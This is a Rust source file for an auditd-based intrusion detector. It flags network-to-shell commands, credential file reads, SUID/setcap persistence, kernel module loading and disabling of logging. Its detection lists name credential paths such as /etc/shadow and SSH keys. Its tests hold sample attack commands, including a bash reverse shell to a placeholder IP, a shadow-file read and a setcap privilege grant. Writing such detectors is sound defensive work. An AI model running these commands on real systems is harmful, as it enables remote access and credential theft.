use crate::detectors::command_profile::assess_network_execution_command;
use crate::detectors::{evidence, string_field, DetectContext, Detector};
use crate::rules::model::RuleMetadata;
use sentinel_core::{Category, Evidence, Finding, RawEvent, Severity};

pub struct AuditDetector;

impl Detector for AuditDetector {
    fn name(&self) -> &'static str {
        "audit_rules"
    }

    fn rules(&self) -> Vec<RuleMetadata> {
        vec![
            RuleMetadata::new(
                "AUDIT-001",
                "Audit log captured network command execution",
                Category::Process,
                Severity::High,
                "auditd captured a short-lived command that bridges network activity into command execution.",
            ),
            RuleMetadata::new(
                "AUDIT-002",
                "Audit log captured non-interactive privilege execution",
                Category::Privilege,
                Severity::Medium,
                "auditd captured sudo, su, or pkexec launching a non-interactive command shell.",
            ),
            RuleMetadata::new(
                "AUDIT-003",
                "Sensitive credential file access command",
                Category::Privilege,
                Severity::High,
                "auditd captured a command explicitly reading or copying a high-value credential file.",
            ),
            RuleMetadata::new(
                "AUDIT-004",
                "Privilege persistence command",
                Category::Privilege,
                Severity::High,
                "auditd captured a command that grants SUID/SGID or file capabilities.",
            ),
            RuleMetadata::new(
                "AUDIT-005",
                "Kernel module manipulation command",
                Category::Rootkit,
                Severity::Medium,
                "auditd captured loading or unloading a kernel module.",
            ),
            RuleMetadata::new(
                "AUDIT-006",
                "Audit or logging service disable command",
                Category::System,
                Severity::High,
                "auditd captured a command that disables auditd or a core logging service.",
            ),
        ]
    }

    fn detect(&self, events: &[RawEvent], ctx: &DetectContext) -> Vec<Finding> {
        if !ctx.config.advanced_collectors.auditd_enabled {
            return Vec::new();
        }
        let mut findings = Vec::new();
        for event in events.iter().filter(|event| event.kind == "audit_exec") {
            if let Some(finding) = audit_network_execution(event, ctx) {
                findings.push(finding);
            }
            if let Some(finding) = audit_privilege_execution(event, ctx) {
                findings.push(finding);
            }
            if let Some(finding) = audit_sensitive_credential_access(event, ctx) {
                findings.push(finding);
            }
            if let Some(finding) = audit_privilege_persistence(event, ctx) {
                findings.push(finding);
            }
            if let Some(finding) = audit_kernel_module_manipulation(event, ctx) {
                findings.push(finding);
            }
            if let Some(finding) = audit_logging_disable(event, ctx) {
                findings.push(finding);
            }
        }
        findings
    }
}

fn audit_network_execution(event: &RawEvent, ctx: &DetectContext) -> Option<Finding> {
    let argv = audit_command(event);
    let assessment = assess_network_execution_command(&argv);
    if !assessment.is_suspicious() {
        return None;
    }
    Some(
        Finding::new(
            &ctx.host_id,
            "Audit log captured network command execution",
            "A short-lived command captured by auditd appears to bridge network activity into command execution.",
            Severity::High,
            Category::Process,
            "AUDIT-001",
            audit_subject(event, &argv),
        )
        .with_evidence(audit_common_evidence(event, &argv, vec![
            evidence("command_features", assessment.feature_names()),
            evidence("risk_reason", assessment.reason_text()),
            evidence("risk_score", assessment.score.to_string()),
        ]))
        .with_impact(vec![
            "Short-lived network execution commands may finish before procfs polling can observe them.".to_string(),
        ])
        .with_recommendations(vec![
            "Review surrounding audit records with the same msg/session id and inspect persistence locations.".to_string(),
            "If this was not an administrative action, preserve audit logs before cleanup.".to_string(),
        ]),
    )
}

fn audit_privilege_execution(event: &RawEvent, ctx: &DetectContext) -> Option<Finding> {
    let argv = audit_command(event);
    if !privilege_command_with_noninteractive_shell(&argv) {
        return None;
    }
    Some(
        Finding::new(
            &ctx.host_id,
            "Audit log captured non-interactive privilege execution",
            "sudo, su, or pkexec launched a non-interactive shell command from audit logs.",
            Severity::Medium,
            Category::Privilege,
            "AUDIT-002",
            audit_subject(event, &argv),
        )
        .with_evidence(audit_common_evidence(event, &argv, vec![
            evidence("privilege_tool", privilege_tool(&argv).unwrap_or("unknown")),
            evidence("risk_reason", "privilege utility launched a command shell"),
            evidence("risk_score", "65"),
        ]))
        .with_impact(vec![
            "Non-interactive privileged commands are common in automation but can also indicate post-login execution.".to_string(),
        ])
        .with_recommendations(vec![
            "Confirm the session, parent process, and operator identity around this audit record.".to_string(),
        ]),
    )
}

fn audit_sensitive_credential_access(
    event: &RawEvent,
    ctx: &DetectContext,
) -> Option<Finding> {
    let argv = audit_command(event);
    let target = sensitive_credential_target(&argv)?;
    Some(
        Finding::new(
            &ctx.host_id,
            "Sensitive credential file access command",
            "A command captured by auditd explicitly referenced a high-value local credential file.",
            Severity::High,
            Category::Privilege,
            "AUDIT-003",
            target,
        )
        .with_evidence(audit_common_evidence(event, &argv, vec![
            evidence("credential_target", target),
            evidence("risk_reason", "command explicitly referenced a sensitive credential path"),
            evidence("risk_score", "80"),
        ]))
        .with_impact(vec![
            "Credential material can be used for privilege escalation, persistence, or lateral movement.".to_string(),
        ])
        .with_recommendations(vec![
            "Confirm the operator and purpose of the access.".to_string(),
            "If unexpected, rotate affected credentials and review subsequent authentication activity.".to_string(),
        ]),
    )
}

fn audit_privilege_persistence(event: &RawEvent, ctx: &DetectContext) -> Option<Finding> {
    let argv = audit_command(event);
    let technique = privilege_persistence_technique(&argv)?;
    Some(
        Finding::new(
            &ctx.host_id,
            "Privilege persistence command",
            "A command captured by auditd appears to grant SUID/SGID permissions or Linux file capabilities.",
            Severity::High,
            Category::Privilege,
            "AUDIT-004",
            audit_subject(event, &argv),
        )
        .with_evidence(audit_common_evidence(event, &argv, vec![
            evidence("privilege_persistence_technique", technique),
            evidence("risk_reason", "command can create a privileged executable"),
            evidence("risk_score", "85"),
        ]))
        .with_impact(vec![
            "Unexpected SUID/SGID bits or file capabilities can provide durable privilege escalation.".to_string(),
        ])
        .with_recommendations(vec![
            "Verify the target file, package ownership, and change ticket before accepting the change.".to_string(),
            "Remove unexpected privilege bits or capabilities after preserving evidence.".to_string(),
        ]),
    )
}

fn sensitive_credential_target(argv: &str) -> Option<&'static str> {
    let lowered = argv.to_ascii_lowercase();
    let read_like = [
        "cat ", "head ", "tail ", "less ", "more ", "grep ", "awk ", "sed ",
        "cp ", "scp ", "rsync ", "tar ", "base64 ", "xxd ",
    ]
    .iter()
    .any(|tool| lowered.starts_with(tool) || lowered.contains(&format!(" {tool}")));
    if !read_like {
        return None;
    }

    const TARGETS: &[(&str, &str)] = &[
        ("/etc/shadow", "/etc/shadow"),
        ("/etc/gshadow", "/etc/gshadow"),
        ("/root/.ssh/id_", "root SSH private key"),
        ("/.ssh/id_", "SSH private key"),
        ("/.aws/credentials", "AWS credentials"),
        ("/.config/gcloud/", "Google Cloud credentials"),
        ("/.kube/config", "Kubernetes credentials"),
    ];
    TARGETS
        .iter()
        .find(|(needle, _)| lowered.contains(needle))
        .map(|(_, label)| *label)
}

fn privilege_persistence_technique(argv: &str) -> Option<&'static str> {
    let lowered = argv.to_ascii_lowercase();
    if lowered.starts_with("setcap ") || lowered.contains(" setcap ") {
        return Some("file_capability");
    }
    if lowered.starts_with("chmod ") || lowered.contains(" chmod ") {
        let suid_markers = [" u+s", " g+s", " +s", " 4755", " 6755", " 4777", " 6777"];
        if suid_markers.iter().any(|marker| lowered.contains(marker)) {
            return Some("suid_sgid");
        }
    }
    if lowered.starts_with("install ") || lowered.contains(" install ") {
        if [" -m 4755", " -m 6755", " --mode=4755", " --mode=6755"]
            .iter()
            .any(|marker| lowered.contains(marker))
        {
            return Some("suid_sgid");
        }
    }
    None
}

fn audit_kernel_module_manipulation(
    event: &RawEvent,
    ctx: &DetectContext,
) -> Option<Finding> {
    let argv = audit_command(event);
    let tool = kernel_module_tool(&argv)?;
    Some(
        Finding::new(
            &ctx.host_id,
            "Kernel module manipulation command",
            "A command captured by auditd loaded or unloaded a kernel module.",
            Severity::Medium,
            Category::Rootkit,
            "AUDIT-005",
            audit_subject(event, &argv),
        )
        .with_evidence(audit_common_evidence(event, &argv, vec![
            evidence("kernel_module_tool", tool),
            evidence("risk_reason", "kernel module state was explicitly changed"),
            evidence("risk_score", "60"),
        ]))
        .with_recommendations(vec![
            "Confirm the module change matches expected driver or maintenance activity.".to_string(),
            "If unexpected, inspect the module path, signer, package ownership, and recent privilege activity.".to_string(),
        ]),
    )
}

fn audit_logging_disable(event: &RawEvent, ctx: &DetectContext) -> Option<Finding> {
    let argv = audit_command(event);
    if !logging_disable_command(&argv) {
        return None;
    }
    Some(
        Finding::new(
            &ctx.host_id,
            "Audit or logging service disable command",
            "A command captured by auditd appears to disable auditing or a core logging service.",
            Severity::High,
            Category::System,
            "AUDIT-006",
            audit_subject(event, &argv),
        )
        .with_evidence(audit_common_evidence(event, &argv, vec![
            evidence("risk_reason", "security logging was explicitly disabled"),
            evidence("risk_score", "90"),
        ]))
        .with_impact(vec![
            "Disabling audit or logging reduces visibility into subsequent attacker activity.".to_string(),
        ])
        .with_recommendations(vec![
            "Verify the maintenance context immediately and restore logging if the action was not expected.".to_string(),
            "Preserve remaining logs and correlate with privilege, process, and persistence findings.".to_string(),
        ]),
    )
}

fn kernel_module_tool(argv: &str) -> Option<&'static str> {
    let tokens = argv.split_whitespace().collect::<Vec<_>>();
    for token in tokens.iter().take(3) {
        match token_basename(token).as_str() {
            "insmod" => return Some("insmod"),
            "modprobe" => return Some("modprobe"),
            "rmmod" => return Some("rmmod"),
            _ => {}
        }
    }
    None
}

fn logging_disable_command(argv: &str) -> bool {
    let lowered = argv.to_ascii_lowercase();
    lowered.contains("auditctl -e 0")
        || lowered.contains("auditctl -e=0")
        || lowered.contains("systemctl stop auditd")
        || lowered.contains("systemctl disable auditd")
        || lowered.contains("service auditd stop")
        || lowered.contains("systemctl stop rsyslog")
        || lowered.contains("systemctl disable rsyslog")
        || lowered.contains("systemctl stop systemd-journald")
}

fn audit_common_evidence(event: &RawEvent, argv: &str, mut extra: Vec<Evidence>) -> Vec<Evidence> {
    let mut items = vec![
        evidence("argv", argv),
        evidence("exe_path", string_field(event, "exe")),
        evidence("process_name", string_field(event, "comm")),
    ];
    for key in [
        "pid",
        "ppid",
        "uid",
        "auid",
        "ses",
        "msg",
        "terminal",
        "ephemeral_event",
        "event_source_detail",
    ] {
        if let Some(value) = event.field(key).filter(|value| !value.trim().is_empty()) {
            items.push(evidence(key, value));
        }
    }
    items.append(&mut extra);
    items
}

fn audit_command(event: &RawEvent) -> String {
    event
        .field("argv")
        .filter(|value| !value.trim().is_empty())
        .map(str::to_string)
        .or_else(|| event.field("comm").map(str::to_string))
        .unwrap_or_default()
}

fn audit_subject<'a>(event: &'a RawEvent, argv: &'a str) -> &'a str {
    event
        .field("exe")
        .or_else(|| event.field("comm"))
        .filter(|value| !value.trim().is_empty())
        .unwrap_or(argv)
}

fn privilege_command_with_noninteractive_shell(argv: &str) -> bool {
    let tokens = argv.split_whitespace().collect::<Vec<_>>();
    let Some(tool) = privilege_tool_from_tokens(&tokens) else {
        return false;
    };
    let has_command_option = tokens.iter().any(|token| {
        matches!(
            token.to_ascii_lowercase().as_str(),
            "-c" | "--command" | "-lc" | "-ic"
        )
    });
    if tool == "su" && has_command_option {
        return true;
    }
    has_command_option && tokens.iter().any(|token| shell_token(token))
}

fn privilege_tool(argv: &str) -> Option<&'static str> {
    let tokens = argv.split_whitespace().collect::<Vec<_>>();
    privilege_tool_from_tokens(&tokens)
}

fn privilege_tool_from_tokens(tokens: &[&str]) -> Option<&'static str> {
    let first = token_basename(tokens.first().copied().unwrap_or(""));
    match first.as_str() {
        "sudo" => Some("sudo"),
        "su" => Some("su"),
        "pkexec" => Some("pkexec"),
        _ => None,
    }
}

fn shell_token(token: &str) -> bool {
    matches!(
        token_basename(token).as_str(),
        "sh" | "bash" | "dash" | "zsh" | "ksh" | "busybox"
    )
}

fn token_basename(token: &str) -> String {
    token
        .trim_matches('"')
        .trim_matches('\'')
        .rsplit('/')
        .next()
        .unwrap_or("")
        .to_ascii_lowercase()
}

#[cfg(test)]
mod tests {
    use super::AuditDetector;
    use crate::detectors::{DetectContext, Detector};
    use sentinel_core::{RawEvent, SentinelConfig};
    use std::sync::Arc;

    #[test]
    fn detects_audit_network_execution_bridge() {
        let ctx = DetectContext::new(Arc::new(SentinelConfig::default()));
        let event = RawEvent::new("auditd", "audit_exec")
            .with_field("argv", "bash -c bash -i >& /dev/tcp/198.51.100.1/4444 0>&1")
            .with_field("exe", "/usr/bin/bash")
            .with_field("comm", "bash");

        let findings = AuditDetector.detect(&[event], &ctx);

        assert!(findings
            .iter()
            .any(|finding| finding.rule_id == "AUDIT-001"));
    }

    #[test]
    fn detects_noninteractive_privilege_execution() {
        let ctx = DetectContext::new(Arc::new(SentinelConfig::default()));
        let event = RawEvent::new("auditd", "audit_exec")
            .with_field("argv", "sudo sh -c id")
            .with_field("exe", "/usr/bin/sudo")
            .with_field("comm", "sudo");

        let findings = AuditDetector.detect(&[event], &ctx);

        assert!(findings
            .iter()
            .any(|finding| finding.rule_id == "AUDIT-002"));
    }

    #[test]
    fn detects_sensitive_credential_read() {
        let ctx = DetectContext::new(Arc::new(SentinelConfig::default()));
        let event = RawEvent::new("auditd", "audit_exec")
            .with_field("argv", "cat /etc/shadow")
            .with_field("exe", "/usr/bin/cat")
            .with_field("comm", "cat");

        let findings = AuditDetector.detect(&[event], &ctx);

        assert!(findings
            .iter()
            .any(|finding| finding.rule_id == "AUDIT-003"));
    }

    #[test]
    fn detects_setcap_persistence() {
        let ctx = DetectContext::new(Arc::new(SentinelConfig::default()));
        let event = RawEvent::new("auditd", "audit_exec")
            .with_field("argv", "setcap cap_setuid+ep /tmp/helper")
            .with_field("exe", "/usr/sbin/setcap")
            .with_field("comm", "setcap");

        let findings = AuditDetector.detect(&[event], &ctx);

        assert!(findings
            .iter()
            .any(|finding| finding.rule_id == "AUDIT-004"));
    }

    #[test]
    fn detects_kernel_module_manipulation() {
        let ctx = DetectContext::new(Arc::new(SentinelConfig::default()));
        let event = RawEvent::new("auditd", "audit_exec")
            .with_field("argv", "sudo modprobe dummy")
            .with_field("exe", "/usr/sbin/modprobe")
            .with_field("comm", "modprobe");

        let findings = AuditDetector.detect(&[event], &ctx);

        assert!(findings
            .iter()
            .any(|finding| finding.rule_id == "AUDIT-005"));
    }

    #[test]
    fn detects_logging_disable_command() {
        let ctx = DetectContext::new(Arc::new(SentinelConfig::default()));
        let event = RawEvent::new("auditd", "audit_exec")
            .with_field("argv", "systemctl stop auditd")
            .with_field("exe", "/usr/bin/systemctl")
            .with_field("comm", "systemctl");

        let findings = AuditDetector.detect(&[event], &ctx);

        assert!(findings
            .iter()
            .any(|finding| finding.rule_id == "AUDIT-006"));
    }

    #[test]
    fn ignores_plain_admin_command() {
        let ctx = DetectContext::new(Arc::new(SentinelConfig::default()));
        let event = RawEvent::new("auditd", "audit_exec")
            .with_field("argv", "sudo systemctl status nginx")
            .with_field("exe", "/usr/bin/sudo")
            .with_field("comm", "sudo");

        let findings = AuditDetector.detect(&[event], &ctx);

        assert!(findings.is_empty());
    }
}
